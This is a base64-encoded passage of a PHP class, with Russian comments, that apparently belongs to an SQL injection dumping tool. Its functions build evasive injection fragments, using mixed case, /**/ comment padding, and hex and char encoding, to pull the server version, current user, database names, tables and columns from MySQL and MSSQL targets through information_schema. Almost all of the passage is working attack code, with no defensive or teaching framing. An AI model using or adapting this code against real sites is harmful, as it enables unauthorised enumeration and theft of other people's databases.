lcl0uLltzeXNkYXRhYmFzZXNdIC8qKi93SGVSZSBbZGJpZF09JGkpIl07CgkJCQoJCQlpZigkYmQgIT0nJykKCQkJewoJCQkJJG1zc3FsW10gPSAkYmQ7CgkJCX0KCQkKCQkJCgkJCQoJCQkKCQl9CgkJCgoJCQkKCQkKCQkJLy8kdGhpcy0+ZCgkdGhpcy0+ZGF0YWJhc2UsJyR0aGlzLT5kYXRhYmFzZScpOwoJCQkKCQkJCgkJCS8vJHRoaXMtPm1zc3FsR2V0RGF0YWJhc2UoKTsKCQkJLy8kdGhpcy0+ZCgkdGhpcy0+ZGF0YWJhc2UsJyR0aGlzLT5kYXRhYmFzZTIyMjInKTsKCQkJLy9leGl0OwoJCQoJCQkKCQkKCQoJCQoJCQoJCSRtc3NxbCA9IGFycmF5X3VuaXF1ZSgkbXNzcWwpOwoJCXJldHVybiAkbXNzcWw7CgoJCS8vfS8vZWxzZQoJCS8vewoJCQkJCQoJCQkvLyRteXNxbCA9IGV4cGxvZGUoJywnLCAkbXlzcWxbJ2NvbmNhdChjYXN0KGdyb3VwX2NvbmNhdChzY2hlbWFfbmFtZSkgYXMgY2hhcikpJ10pOwoJCQkvL3JldHVybiAkbXlzcWw7CgkJCQoJCS8vfQoJCQoJCgoJCQoJfQoJCgkKCS8vLy8KCQoJZnVuY3Rpb24gbXNzcWxHZXRWZXJzaW9uKCl7IC8v0L7Qv9GA0LXQtNC10LvQtdC90LjQtSDQstC10YDRgdC40Lgg0LHQsNC30L7QstCw0Y8g0YTRg9C90LrRhtC40Y8KCQkKCQkKCQkKCQkJCgkJCSRkYXRhID0gJHRoaXMtPm1zc3FsR2V0VmFsdWUoIigvKiovY0FzVChAQHZlcnNpb24gYXMgY2hhcikpIik7CgkJCSR0aGlzLT52ZXJzaW9uID0gJGRhdGFbIigvKiovY0FzVChAQHZlcnNpb24gYXMgY2hhcikpIl07CgkJCSR0aGlzLT52ZXJzaW9uID0gJHRoaXMtPmZpbHRlcl9zdHIoJHRoaXMtPnZlcnNpb24pOwoJCQkKCQkJLy8kdGhpcy0+ZCgkZGF0YSwnJGRhdGEnKTsKCQkKCQkKCX0KCQoJZnVuY3Rpb24gbXNzcWxHZXREYXRhYmFzZSgpeyAvL9C/0L7Qu9GD0YfQuNGC0Ywg0YLQtdC60YPRidGD0Y4g0JHQlAoJCgkJCgkJCSRkYXRhID0gJHRoaXMtPm1zc3FsR2V0VmFsdWUoJ2RiX25hbWUoKScpOwoJCQkvLyR0aGlzLT5kKCRkYXRhLCckZGF0YScpOwoJCQkkdGhpcy0+ZGF0YWJhc2UgPSAkZGF0YVsnZGJfbmFtZSgpJ107CgkJCgkJCQoJCQkvLyR0aGlzLT5kKCR0aGlzLT5kYXRhYmFzZSwnJHRoaXMtPmRhdGFiYXNlJyk7CgkJCgl9CgkKCWZ1bmN0aW9uIG1zc3FsR2V0VXNlcigpeyAvL9C+0L/RgNC10LTQtdC70LXQvdC40LUg0Y7Qt9C10YDQsCDQstGL0LLQvtC00LjRggoJCQoJCS8vc1lzVGVNX1VzRXIKCQkkZGF0YSA9ICR0aGlzLT5tc3NxbEdldFZhbHVlKCdVU2VSX05hTUUoKScpOwoJCQoJCSR0aGlzLT51c2VyID0gJGRhdGFbJ1VTZVJfTmFNRSgpJ107CgkJJHRoaXMtPnVzZXIgPSAkdGhpcy0+ZmlsdGVyX3N0cigkdGhpcy0+dXNlcik7CgkJCgl9CgkKCQoJCgkKCWZ1bmN0aW9uIG1zc3FsR2V0Q29sdW1uc19pbmYoJGJkLCR0YWJsZSl7Ly/Qv9C+0LvRg9GH0LXQvdC40LUg0LLRgdC10YUg0LrQvtC70L7QvdC+0Log0YMg0LrQvtC60YDQtdGC0L3QvtC5INCR0JQg0Lgg0KLQkNCR0JvQmNCm0KsKCQkKCQkkdGFibGVfbmV3ID0gJHRoaXMtPmNoYXJjaGVyX21zc3FsKCR0YWJsZSk7CgkJCgkJJGNvdW50ID0gNTA7CgkJCgkJZm9yICgkaT0wOyRpPCRjb3VudDskaSsrKQoJCXsKCQkJCgkJCSRxcSA9ICR0aGlzLT5tc3NxbEdldFZhbHVlKCIoLyoqL3NFbEVjVCAvKiovZElzVGlOY1QgdG9wIDEgY29sdW1uX25hbWUgZnJvbSAoc2VsZWN0IGRpc3RpbmN0IHRvcCAkaSBjb2x1bW5fbmFtZSBmcm9tICRiZC5pbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSR0YWJsZV9uZXcgb3JkZXIgQlkgY29sdW1uX25hbWUgQVNDKSBzcSBvcmRlciBCWSBjb2x1bW5fbmFtZSBERVNDKSIpOwoJCQkKCQkJJGNvbHVtbiA9ICRxcVsiKC8qKi9zRWxFY1QgLyoqL2RJc1RpTmNUIHRvcCAxIGNvbHVtbl9uYW1lIGZyb20gKHNlbGVjdCBkaXN0aW5jdCB0b3AgJGkgY29sdW1uX25hbWUgZnJvbSAkYmQuaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0kdGFibGVfbmV3IG9yZGVyIEJZIGNvbHVtbl9uYW1lIEFTQykgc3Egb3JkZXIgQlkgY29sdW1uX25hbWUgREVTQykiXTsKCQkJCgkJCS8vJHRoaXMtPmQoJHFxLCckcXEnKTsKCQkJLy9leGl0OwoJCQkKCQkJCgkJCWlmKCRjb2x1bW4gIT0nJykKCQkJewoJCQkJJG1zc3FsW10gPSAkY29sdW1uOwoJCQl9CgkJCQoJCQkkY291bnRfYWxsID0gY291bnQoJG1zc3FsKTsKCQkJJGNvdW50X3VuaXF1ZSA9IGNvdW50KGFycmF5X3VuaXF1ZSgkbXNzcWwpKTsKCQkJCgkJCQoJCQkkdGhpcy0+ZCgkY291bnRfYWxsLCckY291bnRfYWxsJyk7CgkJCSR0aGlzLT5kKCRjb3VudF91bmlxdWUsJyRjb3VudF91bmlxdWUnKTsKCQkJCgkJCWlmKCRjb3VudF9hbGwgPiAkY291bnRfdW5pcXVlKXsKCQkJCSR0aGlzLT5kKCdTVE9QJyk7CgkJCQlicmVhazsKCQkJfQoJCQkKCQkJCgkJCQoJCQkKCQl9CgkJCgkJCgkJcmV0dXJuIGFycmF5X3VuaXF1ZSgkbXNzcWwpOwoJCQoJCQoJfQoJCglmdW5jdGlvbiBtc3NxbEdldEFsbFRhYmxlc19pbmYoJGJkKXsvL9C/0L7Qu9GD0YfQtdC90LjQtSDQktCh0JXQpSDQotCQ0JHQm9CY0KYg0YMg0LrQvtC90LrRgNC10YLQvdC+0Lkg0JHQlAoJCQoJCSRjb3VudCA9ICR0aGlzLT5tc3NxbEdldFZhbHVlKCIoLyoqL3NFbEVjVCAvKiovZGlzdGluY3QgdG9wIDEgLyoqL2NBc1QoY291bnQoKikgYXMgY2hhcikgLyoqL2ZSb00geyRiZH0uaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcykiKTsKCQkKCQkkY291bnQgPSAkY291bnRbIigvKiovc0VsRWNUIC8qKi9kaXN0aW5jdCB0b3AgMSAvKiovY0FzVChjb3VudCgqKSBhcyBjaGFyKSAvKiovZlJvTSB7JGJkfS5pbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzKSJdOwoJCQoJCSR0aGlzLT5kKCRjb3VudCwnY291bnQnLiRiZCk7CgkJCgkJCgkJLy8kY291bnQ9MzA7CgkJCgkJZm9yICgkaT0xOyRpPCRjb3VudDskaSsrKQoJCXsKCQkJCgkJCSRxcSA9ICR0aGlzLT5tc3NxbEdldFZhbHVlKCIoLyoqL3NFbEVjVCAvKiovZGlzdGluY3QgdG9wIDEgLyoqL3RhYmxlX25hbWUgLyoqL2ZSb00gKC8qKi9zRWxFY1QgLyoqL2Rpc3RpbmN0IHRvcCAkaSB0YWJsZV9uYW1lIGZyb20geyRiZH0uaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBvcmRlciBCWSB0YWJsZV9uYW1lIEFTQykgc3Egb3JkZXIgQlkgdGFibGVfbmFtZSBERVNDKSIpOwoJCQkKCQkJCgkJCSR0YWJsZV9vbmUgPSAkcXFbIigvKiovc0VsRWNUIC8qKi9kaXN0aW5jdCB0b3AgMSAvKiovdGFibGVfbmFtZSAvKiovZlJvTSAoLyoqL3NFbEVjVCAvKiovZGlzdGluY3QgdG9wICRpIHRhYmxlX25hbWUgZnJvbSB7JGJkfS5pbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIG9yZGVyIEJZIHRhYmxlX25hbWUgQVNDKSBzcSBvcmRlciBCWSB0YWJsZV9uYW1lIERFU0MpIl07CgkJCQoJCQkKCQkJCgkJCWlmKCR0YWJsZV9vbmUgIT0nJykKCQkJewoJCQkJJG1zc3FsW10gPSAkdGFibGVfb25lOwoJCQl9ZWxzZXsKCQkJCWJyZWFrOwoJCQl9CgkJCQoJCQkKCQkJCgkJCQoJCX0KCQkkbXNzcWwgPSBhcnJheV91bmlxdWUoJG1zc3FsKTsKCQlyZXR1cm4gJG1zc3FsOwoJCQoJCQoJfQoJCgkKCQoJCgkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCQoJLy8vLy8vLy8v0KTRg9C90LrRhtC40Lgg0L7Qv9GA0LXQtNC10LvQtdC90LjRjyDQutC+0L3QutGA0LXRgtC90YvRhSDQv9Cw0YDQsNC80LXRgtGA0L7QsiDQtNC70Y8gTVlTUUwvLy8vCgkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkKCWZ1bmN0aW9uIG15c3FsR2V0QWxsQmQoKXsgLy/Qv9C+0LvRg9GH0LXQvdC40LUg0LLRgdC10YUg0LHQsNC3INC00LDQvdC90YvRhQoJCgkKCQkvLyR0aGlzLT5teXNxbEdldFZlcnNpb24oKTsKCQkKCQkkY291bnQgPSAkdGhpcy0+bXlzcWxHZXRDb3VudEluc2VydCgnaW5mb3JtYXRpb25fc2NoZW1hJywgJ3NjaGVtYXRhJyk7CgkJCgkJaWYoJGNvdW50IDwgMTUpCgkJewoJCQkJLy8kdGhpcy0+ZCgnZ3JvdXBfY29uY2F0IG15c3FsR2V0QWxsQmQnKTsKCQkJCSRteXNxbCA9ICR0aGlzLT5teXNxbEdldFZhbHVlKCdpbmZvcm1hdGlvbl9zY2hlbWEnLCAnc2NoZW1hdGEnLCAnY29uY2F0KGNhc3QoZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKSBhcyBjaGFyKSknLDAsYXJyYXkoKSk7CgkJCQkKCQkJCS8vJG15c3FsID0gZmFsc2U7CgkJCQoJCQkJCgkJCQlpZigkbXlzcWw9PWZhbHNlKQoJCQkJewoJCQkKCQkJCX1lbHNlCgkJCQl7CgkJCQkJJG15c3FsID0gZXhwbG9kZSgnLCcsICRteXNxbFsnY29uY2F0KGNhc3QoZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKSBhcyBjaGFyKSknXSk7CgkJCQkJLy8kdGhpcy0+ZCgkbXlzcWwsJyRteXNxbCcpOwoJCQkJCS8vZXhpdDsKCQkJCQlyZXR1cm4gJG15c3FsOwoJCQkJfQkKCQl9CgkJCgkJCgkJCS8vJGNvdW50PTA7CgkJCSR0aGlzLT50aW1lYXV0ID0gMjA7CgkJCQoJCQlmb3IgKCRpPTA7JGk8JGNvdW50OyRpKyspCgkJCXsKCQkJCQoJCQkJJHFxID0gJHRoaXMtPm15c3FsR2V0VmFsdWUoJ2luZm9ybWF0aW9uX3NjaGVtYScsICdzY2hlbWF0YScsIGFycmF5KCdTQ0hFTUFfTkFNRScpLCRpKTsKCQkJCSRteXNxbFtdID0gJHFxWydTQ0hFTUFfTkFNRSddOwoJCQkJCgkJCX0KCQkJCgkJCQoJCQlpZihlbXB0eSgkbXlzcWwpKXsKCQkJCQoJCQkJJHRoaXMtPm15c3FsR2V0RGF0YWJhc2UoKTsKCQkJCSRteXNxbFtdID0gJHRoaXMtPmRhdGFiYXNlOyAKCQkJCQoJCQkJLy8kdGhpcy0+ZCgkdGhpcy0+ZGF0YWJhc2UsJyR0aGlzLT5kYXRhYmFzZScpOwoJCQkJCgkJCQlpZigkdGhpcy0+ZGF0YWJhc2UgIT0nJyl7cmV0dXJuICRteXNxbDt9CgkJCX0KCQkJCgkJCQoJCQlyZXR1cm4gJG15c3FsOwoJCQkKCQkJCgkJCgkJCgl9CgkKCWZ1bmN0aW9uIG15c3FsR2V0RmllbGRCeVRhYmxlKCRiZCwkdGFibGUpey8v0L/QvtC70YPRh9C10L3QuNC1INC/0L7Qu9C10Lkg0LjQtyDQsdC0INC4INGC0LDQsdC70LjRhtGLCgkJCgkJJGNvdW50ID0gJHRoaXMtPm15c3FsR2V0Q291bnRJbnNlcnQoJ2luZm9ybWF0aW9uX3NjaGVtYScsICdDT0xVTU5TJywnV0hFUkUgVEFCTEVfU0NIRU1BPScuJHRoaXMtPnN0clRvSGV4KCRiZCkuJyBBTkQgVEFCTEVfTkFNRT0nLiR0aGlzLT5zdHJUb0hleCgkdGFibGUpLicnKTsKCQkKCQlpZigkY291bnQgPCAxNSkKCQl7CgkJCSRteXNxbCA9ICR0aGlzLT5teXNxbEdldFZhbHVlKCdpbmZvcm1hdGlvbl9zY2hlbWEnLCAnQ09MVU1OUycsIGFycmF5KCdjb25jYXQoY2FzdChncm91cF9jb25jYXQoQ09MVU1OX05BTUUpIGFzIGNoYXIpKScpLDAsYXJyYXkoKSwnV0hFUkUgVEFCTEVfU0NIRU1BPScuJHRoaXMtPnN0clRvSGV4KCRiZCkuJyBBTkQgVEFCTEVfTkFNRT0nLiR0aGlzLT5zdHJUb0hleCgkdGFibGUpLicnKTsKCQkJCgkJCQlpZigkbXlzcWw9PWZhbHNlKQoJCQkJewoJCQkJCQoJCQkJfWVsc2UKCQkJewoJCQkJCQoJCQkJJG15c3FsID0gZXhwbG9kZSgnLCcsICRteXNxbFsnY29uY2F0KGNhc3QoZ3JvdXBfY29uY2F0KENPTFVNTl9OQU1FKSBhcyBjaGFyKSknXSk7CgkJCQlyZXR1cm4gJG15c3FsOwoJCQkJCgkJCX0JCgkJCQoJCX0KCQkKCgkJCSR0aGlzLT50aW1lYXV0ID0gMjA7CgkJCQoJCQlmb3IgKCRpPTA7JGk8JGNvdW50OyRpKyspCgkJCXsKCQkJCQoJCQkJJHFxID0gJHRoaXMtPm15c3FsR2V0VmFsdWUoJ2luZm9ybWF0aW9uX3NjaGVtYScsICdDT0xVTU5TJywgYXJyYXkoJ2NvbHVtbl9uYW1lJyksJGksYXJyYXkoKSwnV0hFUkUgVEFCTEVfU0NIRU1BPScuJHRoaXMtPnN0clRvSGV4KCRiZCkuJyBBTkQgVEFCTEVfTkFNRT0nLiR0aGlzLT5zdHJUb0hleCgkdGFibGUpLicnKTsKCQkJCQoJCQkJJHFxWydjb2x1bW5fbmFtZSddID0gc3RyX3JlcGxhY2UoJy8vJywnJywkcXFbJ2NvbHVtbl9uYW1lJ10pOwoJCQkJJG15c3FsW10gPSAkcXFbJ2NvbHVtbl9uYW1lJ107CgkJCQkKCQkJfQoJCQkKCQkJcmV0dXJuICRteXNxbDsKCgkJCgkJCgkvLy8JcmV0dXJuICRteXNxbDsKCQkKCX0KCQoJZnVuY3Rpb24gbXlzcWxHZXRUYWJsZXNCeURkKCRiZCl7Ly/Qv9C+0LvRg9GH0LXQvdC40LUg0YLQsNCx0LvQuNGGINC40Lcg0JHQlAoJCQoJCS8vJHRoaXMtPmQoJ215c3FsR2V0VGFibGVzQnlEZCggbmFjYWhsbycpOwoJCQoJCSRjb3VudCA9ICR0aGlzLT5teXNxbEdldENvdW50SW5zZXJ0KCdpbmZvcm1hdGlvbl9zY2hlbWEnLCAndGFibGVzJywnV0hFUkUgVEFCTEVfU0NIRU1BPScuJHRoaXMtPnN0clRvSGV4KCRiZCkuJycpOwoJCQoJCS8vJHRoaXMtPmQoJGNvdW50LCckY291bnQnKTsKCQkKCQlpZigkY291bnQgPCAxNSkKCQl7CgkJCSRteXNxbCA9ICR0aGlzLT5teXNxbEdldFZhbHVlKCdpbmZvcm1hdGlvbl9zY2hlbWEnLCAndGFibGVzJywgYXJyYXkoJ2NvbmNhdChjYXN0KGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBhcyBjaGFyKSknKSwwLGFycmF5KCksJ1dIRVJFIFRBQkxFX1NDSEVNQT0nLiR0aGlzLT5zdHJUb0hleCgkYmQpLicnKTsKCQkJLy8kdGhpcy0+ZCgkbXlzcWwsJ215c3FsR2V0VGFibGVzQnlEZCcpOwoJCQkKCQkJaWYoJG15c3FsPT1mYWxzZSkKCQkJewoJCQkKCQkJfWVsc2UKCQkJewoJCQkJCgkJCQkkbXlzcWwgPSBleHBsb2RlKCcsJywgJG15c3FsWydjb25jYXQoY2FzdChncm91cF9jb25jYXQodGFibGVfbmFtZSkgYXMgY2hhcikpJ10pOwoJCQkJJHRoaXMtPmQoJ215c3FsIFRSVUUgYmQnKTsKCQkJCgkJCQlyZXR1cm4gJG15c3FsOwoJCQkKCQkJfQkKCQl9CgkJCQoJCQoJCQkvLyR0aGlzLT5kKCdteXNxbCBmYWxzZTxicj4nKTsKCQkKCQkJCgkJCQoJCQoJCQkKCQkJJGsgPSAwOwoJCQkKCQkJJHRoaXMtPnRpbWVhdXQgPSAyMDsKCQkJCgkJCWZvciAoJGk9MDskaTwkY291bnQ7JGkrKykKCQkJewoJCQkJCgkJCQkkcXEgPSAkdGhpcy0+bXlzcWxHZXRWYWx1ZSgnaW5mb3JtYXRpb25fc2NoZW1hJywgJ3RhYmxlcycsIGFycmF5KCd0YWJsZV9uYW1lJyksJGksYXJyYXkoKSwnV0hFUkUgVEFCTEVfU0NIRU1BPScuJHRoaXMtPnN0clRvSGV4KCRiZCkuJycpOwoJCQkJJG15c3FsW10gPSAkcXFbJ3RhYmxlX25hbWUnXTsKCQkJCQoJCQkJLy8kdGhpcy0+ZCgkcXFbJ3RhYmxlX25hbWUnXSwnJHFxW3RhYmxlX25hbWVdJyk7CgkJCQkvL2lmKCRpPT0yKXJldHVybiAkbXlzcWw7CgkJCQoJCQkJCgkJCQkKCQkJCWlmKGVtcHR5KCRxcVsndGFibGVfbmFtZSddKSkkaysrOwoJCQkJCgkJCQlpZigkaz09NCkKCQkJCXsKCQkJCQkkdGhpcy0+ZCgnaz09NCBodWV2byBwdXN0bycpOwoJCQkJCXJldHVybiAkbXlzcWw7CgkJCQl9CgkJCQkKCQkJfQoJCQkKCQkJcmV0dXJuICRteXNxbDsKCQkKCQkJCgl9CgoJZnVuY3Rpb24gbXlzcWxHZXRDb3VudFRhYmxlc0JEKCRiZCl7Ly8g0L/QvtC70YPRh9C10L3QuNC1INC60L7Qu9C40YfQtdGB0YLQstCwINGC0LDQsdC70LjRhiDRgyDQkdCUCgkJCgkJJGNvdW50ID0gJHRoaXMtPm15c3FsR2V0Q291bnRJbnNlcnQoJ2luZm9ybWF0aW9uX3NjaGVtYScsICd0YWJsZXMnLCdXSEVSRSBUQUJMRV9TQ0hFTUE9Jy4kdGhpcy0+c3RyVG9IZXgoJGJkKS4nJyk7CgkJCgkJLy8kdGhpcy0+ZCgkY291bnQsJyRjb3VudCcpOwoJCS8vZXhpdDsKCQlyZXR1cm4gJGNvdW50OwoJCQoJfQoJCglmdW5jdGlvbiBteXNxbEdldFZlcnNpb24oKXsgLy/QvtC/0YDQtdC00LXQu9C10L3QuNC1INCy0LXRgNGB0LjQuCDQsdCw0LfQvtCy0LDRjyDRhNGD0L3QutGG0LjRjwoJCQoJCQoJCgkJJGRhdGEgPSAkdGhpcy0+bXlzcWxHZXRWYWx1ZSgnJywnJywndkVyc2lvbigpJywkbGltaXQ9MCwkb3JkZXI9YXJyYXkoKSwkd2hlcmU9JycpOwoJCQoKCQkkdGhpcy0+dmVyc2lvbiA9ICRkYXRhWyd2RXJzaW9uKCknXTsKCQkkdGhpcy0+dmVyc2lvbiA9ICRkYXRhWyd2RXJzaW9uKCknXTsKCQkkdGhpcy0+dmVyc2lvbiA9ICR0aGlzLT5maWx0ZXJfc3RyKCR0aGlzLT52ZXJzaW9uKTsKCQkKCQkkZyA9ICRkYXRhWyd2RXJzaW9uKCknXTsKCQlyZXR1cm4gJGc7CgkJCgkJCgkJLy8kdGhpcy0+dmVyc2lvbiA9ICR0aGlzLT5maWx0ZXJfc3RyKCR0aGlzLT52ZXJzaW9uKTsKCQkKCQkvLyR0aGlzLT5kKCR0aGlzLT52ZXJzaW9uLCckdGhpcy0+dmVyc2lvbicpOwoJCQoJCS8vJHRoaXMtPmQoJGRhdGEsJyR0aGlzLT5teXNxbEdldFZhbHVlJyk7CgkJCgkJCgkJCgl9CgkKCWZ1bmN0aW9uIG15c3FsR2V0VXNlcigpeyAvL9C+0L/RgNC10LTQtdC70LXQvdC40LUg0Y7Qt9C10YDQsCDQstGL0LLQvtC00LjRggoJCQoJCQoJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWUoJycsJycsJ1VzZVIoKScsJGxpbWl0PTAsJG9yZGVyPWFycmF5KCksJHdoZXJlPScnKTsKCQkKCQkkdGhpcy0+dXNlciA9ICRkYXRhWydVc2VSKCknXTsKCQkkdGhpcy0+dXNlciA9ICR0aGlzLT5maWx0ZXJfc3RyKCR0aGlzLT51c2VyKTsKCQkKCQkKCQkKCX0KCQoJZnVuY3Rpb24gbXlzcWxHZXREYXRhYmFzZSgpeyAvL9C/0L7Qu9GD0YfQuNGC0Ywg0YLQtdC60YPRidGD0Y4g0JHQlAoJCgkJaWYoJHRoaXMtPm1zc3FsPT10cnVlKQoJCXsKCQkJJGRhdGEgPSAkdGhpcy0+bXNzcWxHZXRWYWx1ZSgnJywnJywnZGJfbmFtZSgpJywkbGltaXQ9MCwkb3JkZXI9YXJyYXkoKSwkd2hlcmU9JycpOwoJCQkkdGhpcy0+ZGF0YWJhc2UgPSAkZGF0YVsnZGJfbmFtZSgpJ107CgkJfWVsc2UKCQl7CgkJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWUoJycsJycsJ2RhdGFiYXNlKCknLCRsaW1pdD0wLCRvcmRlcj1hcnJheSgpLCR3aGVyZT0nJyk7CgkJCSR0aGlzLT5kYXRhYmFzZSA9ICRkYXRhWydkYXRhYmFzZSgpJ107CgkJfQkKCQkKCQkJJHRoaXMtPmQoJHRoaXMtPmRhdGFiYXNlLCckdGhpcy0+ZGF0YWJhc2UnKTsKCQkKCX0KCQoJCgkKCSAKCQoJLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoJLy8vLy8vLy8vLy8vLy8v0JHQkNCX0J7QktCr0JUg0JTQm9CvINCX0JDQn9Cg0J7QodCe0JIgTVlTUUwvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoJLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoJCgkKCQoJCglmdW5jdGlvbiBteXNxbEdldFZhbHVlX29sZCgkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdD0wLCRvcmRlcj1hcnJheSgpLCR3aGVyZT0nJyl7CgkJCgkJCWlmKCR0aGlzLT5tZXRob2RfaGV4ID09dHJ1ZSAgQU5EICR0aGlzLT5tZXRob2RfYXV0byA9PWZhbHNlKXsKCQkJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWVIRVgoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQsJG9yZGVyLCR3aGVyZSk7CgkJCQlyZXR1cm4gJGRhdGE7CgkJCX0KCQkJCgkJCQoJCQlpZigkdGhpcy0+bWV0aG9kX2NoYXIgPT10cnVlIEFORCAkdGhpcy0+bWV0aG9kX2F1dG8gPT1mYWxzZSl7CgkJCQkkZGF0YSA9ICR0aGlzLT5teXNxbEdldFZhbHVlQ0hBUigkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdCwkb3JkZXIsJHdoZXJlKTsKCQkJCXJldHVybiAkZGF0YTsKCQkJfQoJCQkKCQkJCgkJCQoJCQlpZigkdGhpcy0+bWV0aG9kX2F1dG8gPT10cnVlKQoJCQl7CgkJCQoJCQkJCgkJCQkKCQkJCWlmKCR0aGlzLT5tZXRob2RfaGV4ID09dHJ1ZSl7CgkJCQkJCgkJCQkJJGRhdGEgPSAkdGhpcy0+bXlzcWxHZXRWYWx1ZUhFWCgkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdCwkb3JkZXIsJHdoZXJlKTsKCQkJCX1lbHNlCgkJCQl7CgkJCQkJCgkJCQkJCgkJCQkJaWYoJHRoaXMtPm1ldGhvZF9jaGFyID09dHJ1ZSkKCQkJCQl7CgkJCQkJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWVDSEFSKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0LCRvcmRlciwkd2hlcmUpOwoJCQkJCQkKCQkJCQkJaWYoJGRhdGFbMF0gIT0nJyBBTkQgY291bnQoJGRhdGEpPT0wKQoJCQkJCQl7CgkJCQkJCQkkdGhpcy0+bWV0aG9kX2NoYXIgPSB0cnVlOwoJCQkJCQkJcmV0dXJuICRkYXRhOwoJCQkJCQl9CgkJCQkJCQoJCQkJCX0KCQkJCQkKCQkJCQoJCQkJCQoJCQkJCQoJCQkJCWlmKCRkYXRhWzBdPT0nJyBBTkQgY291bnQoJGRhdGEpPT0wKQoJCQkJCXsKCQkJCQkJCgkJCQkJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWVIRVgoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQsJG9yZGVyLCR3aGVyZSk7CgkJCQkJCQoJCQkJCQkKCQkJCQkJaWYoJGRhdGFbMF0gPT0nJyBBTkQgY291bnQoJGRhdGEpPT0wKQoJCQkJCQl7CgkJCQkJCQkKCQkJCQkJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWVDSEFSKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0LCRvcmRlciwkd2hlcmUpOwoJCQkJCQkJCgkJCQkJCQlpZigkZGF0YVswXSA9PScnIEFORCBjb3VudCgkZGF0YSk9PTApCgkJCQkJCQl7CgkJCQkJCQkJCQoJCQkJCQkJCSR0aGlzLT5tZXRob2RfaGV4ID0gdHJ1ZTsKCQkJCQkJCQkJCgkJCQkJCQkJCQoJCQkJCQkJfWVsc2V7CgkJCQkJCQkJJHRoaXMtPm1ldGhvZF9jaGFyID10cnVlOwoJCQkJCQkJfQoJCQkJCQkJCgkJCQkJCX1lbHNlewoJCQkJCQkJJHRoaXMtPm1ldGhvZF9oZXggPSB0cnVlOwoJCQkJCQl9CgkJCQkJCQkKCQkJCQkJCgkJCQkJCQkKCQkJCQl9CgkJCQl9CgkJCQkKCQkJCQoJCQkJcmV0dXJuICRkYXRhOwoJCQl9CgkJCgl9CgkKCQoJCgkKCWZ1bmN0aW9uIG15c3FsR2V0VmFsdWUoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQ9MCwkb3JkZXI9YXJyYXkoKSwkd2hlcmU9JycpewoJCQoJCQlpZigkdGhpcy0+bWV0aG9kX2hleCA9PXRydWUgIEFORCAkdGhpcy0+bWV0aG9kX2F1dG8gPT1mYWxzZSl7CgkJCQkkZGF0YSA9ICR0aGlzLT5teXNxbEdldFZhbHVlSEVYKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0LCRvcmRlciwkd2hlcmUpOwoJCQkJcmV0dXJuICRkYXRhOwoJCQl9CgkJCQoJCQkKCQkJaWYoJHRoaXMtPm1ldGhvZF9jaGFyID09dHJ1ZSBBTkQgJHRoaXMtPm1ldGhvZF9hdXRvID09ZmFsc2UpewoJCQkJJGRhdGEgPSAkdGhpcy0+bXlzcWxHZXRWYWx1ZUNIQVIoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQsJG9yZGVyLCR3aGVyZSk7CgkJCQlyZXR1cm4gJGRhdGE7CgkJCX0KCQkJCgkJCQoJCQlpZigkdGhpcy0+bWV0aG9kX2lmbnVsbCA9PXRydWUgQU5EICR0aGlzLT5tZXRob2RfYXV0byA9PWZhbHNlKXsKCQkJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWVJRk5VTEwoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQsJG9yZGVyLCR3aGVyZSk7CgkJCQlyZXR1cm4gJGRhdGE7CgkJCX0KCQkJCgkJCQoJCQlpZigkdGhpcy0+bWV0aG9kX2F1dG8gPT10cnVlKQoJCQl7CgkJCQoJCQkJCgkJCQkKCQkJCWlmKCR0aGlzLT5tZXRob2RfaGV4ID09dHJ1ZSl7CgkJCQkJCgkJCQkJJGRhdGEgPSAkdGhpcy0+bXlzcWxHZXRWYWx1ZUhFWCgkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdCwkb3JkZXIsJHdoZXJlKTsKCQkJCX1lbHNlaWYoJHRoaXMtPm1ldGhvZF9pZm51bGw9PXRydWUpCgkJCQl7CgkJCQkJJGRhdGEgPSAkdGhpcy0+bXlzcWxHZXRWYWx1ZUlGTlVMTCgkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdCwkb3JkZXIsJHdoZXJlKTsKCQkJCQkKCQkJCQlpZigkZGF0YVswXSAhPScnIEFORCBjb3VudCgkZGF0YSk9PTApCgkJCQkJCXsKCQkJCQkJCSR0aGlzLT5tZXRob2RfY2hhciA